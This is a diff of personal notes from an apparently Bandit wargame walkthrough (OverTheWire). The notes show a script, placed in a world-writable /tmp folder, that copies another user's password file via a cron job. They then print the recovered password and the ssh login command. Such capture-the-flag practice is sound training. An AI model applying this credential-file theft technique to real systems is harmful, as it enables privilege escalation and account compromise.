@@ -226,13 +226,13 @@ chmod 777 /tmp/rom // read write exe for all users in that directory
 date
 nano get.sh 
 
-// inside nano 
+// inside nano get.sh
 #!/bin/bash
 cat /etc/bandit_pass/bandit24 > /tmp/rom/password.txt
 // 
 
 ls get.sh
-chmod +x get.sh
+chmod +x get.sh // making it executable with chmod +x
 cat /tmp/rom/password.txt
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ssh -p 2220 bandit24@bandit.labs.overthewire.org
